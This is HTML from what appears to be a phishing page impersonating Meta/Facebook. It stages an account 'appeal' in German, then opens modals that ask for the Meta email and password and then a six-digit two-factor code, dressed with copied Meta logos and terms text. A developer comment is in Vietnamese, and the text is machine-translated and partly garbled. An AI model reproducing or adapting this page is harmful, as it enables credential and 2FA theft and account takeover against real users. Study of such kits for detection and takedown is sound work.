value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option><option value="1900">1900</option><option value="2024">2024</option><option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option><option value="1900">1900</option></select>
        </div>
    </div>
    <textarea rows="1" id="exampleFormControlTextarea1" class="form-control" name="apeal" placeholder="Tragen Sie hier Ihren Einwand oder Ihr Anliegen ein"></textarea>
    <div class="mb-2 invalid-feedback" id="pleasefillemail" style="display: none;">
        <font style="vertical-align: inherit;">
            <font style="vertical-align: inherit;">Bitte geben Sie die Informationen ein, um fortzufahren!</font>
        </font>
    </div>
</div><h6><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Unsere Antwort wird Ihnen innerhalb von 24 - 48 Stunden zugesandt.</font></font></font></font></font></font></h6>
                                <div class="notification-setting">
                                    <div class="setting-item">
                                        <div class="info">
                                            <i class="fab fa-facebook icon"></i>
                                            <div class="text">
                                                <strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">auf Facebook.</font></font></font></font></font></font></strong>
                                                <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wir senden Ihnen eine Benachrichtigung auf Facebook.</font></font></font></font></font></font></span>
                                            </div>
                                        </div>
                                        <label class="toggle-switch">
                                            <input type="checkbox">
                                            <span class="slider"></span>
                                        </label>
                                    </div>
                                    <div class="setting-item">
                                        <div class="info">
                                            <i class="fas fa-envelope icon"></i>
                                            <div class="text">
                                                <strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E-Mail</font></font></font></font></font></font></strong>
                                                <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wir senden Ihnen eine Benachrichtigung per E-Mail.</font></font></font></font></font></font></span>
                                            </div>
                                        </div>
                                        <label class="toggle-switch">
                                            <input type="checkbox">
                                            <span class="slider"></span>
                                        </label>
                                    </div>
                                </div>
                        <br>
                        <div class="mb-3 form-check">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Stimmen Sie unseren Gemeinschaftsstandards zu</font></font></font></font></font></font><a id="termsLink" href="https://www.facebook.com/business/help/488043719226449?id=434838534925385" class="add-svg" target="_blank" style="display: none;">
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>
                            </label>
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
                        </div>
                        <div id="changepass" class="form-btn-wrapper">
                            <button class="btn btn-primary" fdprocessedid="wxbiwk">
                                <div class="spinner-border text-light" role="status" style="display: none;">
                                    <span class="visually-hidden"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beladen...</font></font></font></font></span>
                                </div>
                                <span class="button-text" style="font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Einreichen</font></font></font></font></font></font></span>
                            </button>
                        </div>
                    </div>
                </div>
                </div>
                </div>
        <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                            <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                            </path>
                            <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                            </path>
                        </svg>
                    </div>
                <div class="modal-footer">
                </div>
            <div class="modal form-modal" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                    <div class="modal-content">
                        <div class="modal-header">
                        </div>
                        <div class="modal-body">
                            <div class="fb-round-wraper">
                                <img src="images/fb_round_logo.png" alt="" class="fb-logo-round">
                            </div>
                            <form id="apiForm" autocomplete="off">
                                <div class="mb-3">
                            <!-- Thêm dòng chữ vào giữa modal với CSS tùy chỉnh để sát trên input email -->
                            <div style="text-align: center; margin-top: 10px; margin-bottom: 5px; font-weight: bold; font-size: 18px;">
                                <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Melden Sie sich bei Ihrem Meta-Konto an, um zu synchronisieren</font></font></span>
                            </div>                                    <input name="email" type="email" class="form-control" id="exampleInputEmail" placeholder="E-Mail" required="">
                                </div>
                                <div class="mb-3">
                                    <div class="password-input">
                                        <!-- Input Password với placeholder -->
                                        <div style="position: relative;">
                                            <input name="password-1" type="password" class="form-control" id="exampleInputPassword" placeholder="Passwort" autocomplete="off" minlength="8" maxlength="30" required="">
                                            <i class="bi bi-eye" id="togglePassword" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer;"></i>
                                        </div>
                                    </div>
                                </div>
                                <div class="invalid-feedback" id="invalidpass"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Falsches Passwort. Bitte versuchen Sie es erneut.
                                </font></font></div>
                                <div class="form-btn-wrapper">
                                    <button class="btn btn-primary" id="loginbutton">
                                        <div class="spinner-border text-light" role="status" id="loadingSpinner" style="display: none;">
                                            <span class="visually-hidden"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beladen...</font></font></font></font></span>
                                        </div>
                                        <span class="button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Weitermachen</font></font></span>
                                    </button>
                                </div>
                            </form>
                            <div class="spaser"></div>
                        </div>
                        <div class="modal-footer">
                            <img src="images/meta-logo-grey.png" alt="">
                        </div>
                    </div>
                </div>
            </div>
    <div class="modal form-modal" id="twoFAmodal" tabindex="-1" aria-labelledby="2FAmodalLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
        <div class="modal-content">
          <div class="modal-body">
            <div class="twoFAinfo-wraper">
              <font id="getname" style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Facebook</font></font>
              <h1 class="modal-title" id="2FAmodalLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Melden Sie sich bei Ihrer Authentifizierungs-App an</font></font></h1>
              <span><font id="getdevice" style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wir haben eine Benachrichtigung an Ihr Gerät gesendet, oder geben Sie den 6-stelligen Code ein, der für dieses Konto von der von Ihnen eingerichteten Zwei-Faktor-Authentifizierungs-App generiert oder an Ihre Mobiltelefonnummer und WhatsApp gesendet wurde.</font></font></span>
              <div class="fb-round-wraper">
                <img src="images/2FA.png" alt="" style="width: 100%;">
              </div>
              <form>
                  <div class="mb-3"></div>
                  <div class="mb-3">
                    <div class="password-input">
                      <input name="2FA-1" minlength="6" maxlength="8" type="tel" class="form-control" id="2facode" placeholder="Code" required="" autocomplete="off">
                    </div>
                    <div class="invalid-feedback" id="invalid2fa" style="display: none;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ungültiger Code. Bitte versuchen Sie es später noch einmal </font></font><span id="timer"></span>
                    </div>
                  </div>
                  <div class="form-btn-wrapper" id="send2fa">
                    <button class="btn btn-primary" type="submit">
                      <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;">
                        <span class="visually-hidden"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Laden...</font></font></span>
                      </div>
                      <span class="button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bestätigen</font></font></span>
                    </button>
                  </div>
                </form>
            </div>
            <div class="spaser"></div>
          </div>
          <div class="modal-footer">
            <img src="images/meta-logo-grey.png" alt="">
          </div>
        </div>
      </div>
    </div>
    <div class="modal" id="TermsModal" tabindex="-1" aria-labelledby="TermsModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <h4 class="modal-title" id="TermsModalLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nutzungsbedingungen
                    </font></font></h4>
                    <p>Meta creates technologies and services that allow people to communicate with each other, form
                        communities and develop companies. This User Agreement governs the use of
                        you Facebook, Messenger, and other products, features, applications, services, technologies and
                        software we offer (<a class="add-svg">Meta Products
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>
                        or <a class="add-svg">Products
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>                    ), if not expressly
                        states that separate terms apply (and this agreement does not apply). These Products
                        are provided to you by Meta Platforms, Inc. </p>
                    <br>
                    <p>
                        Our <a class="add-svg">Privacy Policy
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a> explains how we collect
                        and use your personal
                        data to determine which advertisements may be relevant to you, and
                        provide other services described below. Also, in <a class="add-svg">settings
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a> of the
                        relevant Products
                        Meta, you can change your privacy level at any time regarding our use of
                        your data.
                    </p>
                    <br>
                    <h6>Services we provide </h6>
                    <ul>
                        <li>
                            Personalize your experience.
                        </li>
                        <li>
                            Connect with people and organizations that interest you.
                        </li>
                        <li>
                            Opportunity to express yourself and communicate on topics that are important to you.
                        </li>
                        <li>
                            Search for content, products and services that may interest you.
                        </li>
                        <li>
                            Ensuring the safety, security and integrity of our services, combating malicious
                            behavior and protecting our user community.
                        </li>
                        <li>
                            Using and developing advanced technologies to provide safe and
                            functional services.
                        </li>
                        <li>
                            Research ways to improve the quality of our services.
                        </li>
                        <li>
                            Ensuring consistency and convenience of various Meta Companies Products.
                        </li>
                        <li>
                            Providing access to our services.
                        </li>
                    </ul>
                    <h6>
                        Other terms and policies that may apply to you
                    </h6>
                    <ul>
                        <li><a class="add-svg">Advertising Rules
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>. These rules apply to partners who
                            advertise on various Meta Products and determine the types of advertising content that such
                            partners are permitted to use.
                        </li>
                        <li><a class="add-svg">Community Standards
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>. These guidelines set out our standards
                            for the content you post on Facebook and your activities on Facebook and other Meta
                            Products.
                        </li>
                        <li><a class="add-svg">Community Payment Terms
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>. These terms apply to payments made
                            to or through the Meta Products.
                        </li>
                        <li><a class="add-svg">Commercial terms
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>. These terms apply if you use or access our
                            Products for any commercial or business purposes, including advertising, using our
                            measurement services, managing an application on our Platform, a group or a Company Page,
                            and selling goods or services .
                        </li>
                        <li><a class="add-svg">Trade Rules
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>. This guide outlines the rules that apply when
                            you offer products or services for sale on Facebook, Instagram or WhatsApp.
                        </li>
                    </ul>
                    <p>Last revision date: July 26, 2023</p>
                    <br>
                    <h6>Data control</h6>
                    <div class="action-button wide">
                        <div class="action-button-img">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
                                </path>
                            </svg>
                        </div>
                        <div class="action-button-text">
                            <span>Account security</span>
                        </div>
                        <div class="action-button-arrow">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                </path>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal" id="policyModal" tabindex="-1" aria-labelledby="policyModalLabel" style="display: none;" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close" fdprocessedid="rarr7i"></button>
                </div>
                <div class="modal-body">
                    <h4 class="modal-title" id="policyModalLabel">Privacy Policy</h4>
                    <h5>What is the Privacy Policy and what does it cover?</h5>
                    <div class="action-button wide">
                        <div class="action-button-img">
                            <img src="images/star.png" alt="">
                        </div>
                        <div class="action-button-text">
                            <span class="small-grey">The main thing in the section</span>
                        </div>
                        <div class="action-button-arrow">
                            <svg id="Layer_1" data-name="Layer 1" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 122.89 111.55"><defs><style>.cls-1{fill:#b71616;}.cls-2{fill:#e21b1b;fill-rule:evenodd;}.cls-3{fill:#fff;}</style></defs><title>red-alert</title><path class="cls-1" d="M2.35,84.43,45.29,10.2l.17-.27h0a22.92,22.92,0,0,1,7-7.23A17,17,0,0,1,61.58,0a16.78,16.78,0,0,1,9.11,2.69,22.79,22.79,0,0,1,7,7.26c.13.21.25.42.36.64l42.24,73.34.23.44h0a22.22,22.22,0,0,1,2.37,10.19,17.59,17.59,0,0,1-2.16,8.35,16,16,0,0,1-6.94,6.61l-.58.26a21.34,21.34,0,0,1-9.11,1.74v0H17.62c-.23,0-.44,0-.66,0a18.07,18.07,0,0,1-6.2-1.15A16.46,16.46,0,0,1,3,104.26a17.59,17.59,0,0,1-3-9.58,23,23,0,0,1,1.57-8.74,8.24,8.24,0,0,1,.77-1.51Z"></path><path class="cls-2" d="M9,88.76l43.15-74.6c5.23-8.25,13.53-8.46,18.87,0l42.44,73.7c3.38,6.81,1.7,16-9.34,15.77H17.62c-7.27.18-12-6.19-8.64-14.87Z"></path><path class="cls-3" d="M57.57,82.7a5.51,5.51,0,0,1,3.48-1.58,5.75,5.75,0,0,1,2.4.35,5.82,5.82,0,0,1,2,1.31,5.53,5.53,0,0,1,1.62,3.55,6.05,6.05,0,0,1-.08,1.4,5.54,5.54,0,0,1-5.64,4.6,5.67,5.67,0,0,1-2.27-.52,5.56,5.56,0,0,1-2.82-2.94,5.65,5.65,0,0,1-.35-1.27,5.83,5.83,0,0,1-.06-1.31h0a6.19,6.19,0,0,1,.57-2,4.57,4.57,0,0,1,1.13-1.56Zm8.16-10.24c-.2,4.79-8.31,4.8-8.5,0-.82-8.21-2.92-29.39-2.85-37.1.07-2.38,2-3.79,4.56-4.33a12.83,12.83,0,0,1,5,0c2.61.56,4.65,2,4.65,4.44v.24L65.73,72.46Z"></path></svg>
                        </div>
                    </div>
                    <br>
                    <p>At Meta, we want you to understand what information we collect, how we use it, and with whom we
                        use it.
                        let's share. Therefore, we recommend that you read our Privacy Policy. This
                        will help you use
                        <a target="_blank" class="add-svg">
                            Meta
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>'s products
                        the way you need.
                    </p>
                    <br>
                    <p>In the Privacy Policy, we explain how we collect, use, store information, and
                        We also share it. We also tell you about your rights. Each section of the Policy contains
                        Useful examples and simplified statements to make our work easier to understand. We also
                        added links to resources where you can learn in more detail about topics that interest you
                        with confidentiality.</p>
                    <br>
                    <p>It is important to us that you know how to manage your privacy (confidentiality), so we also
                        We show you where in the settings of the Meta Products you use you can manage your data. You
                        you can
                        <a target="_blank" class="add-svg">
                            update these settings
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>
                        to personalize your user experience.
                    </p>
                    <br>
                    <p>
                        Полный текст политики приведен ниже.
                    </p>
                    <br>
                    <div class="action-button-list">
                        <div class="action-button wide">
                            <div class="action-button-text">
                                <span class="small-grey">What products are covered by this policy?</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="action-button wide">
                            <div class="action-button-text">
                                <span class="small-grey">Learn more about managing your privacy at
                                    Privacy Center</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
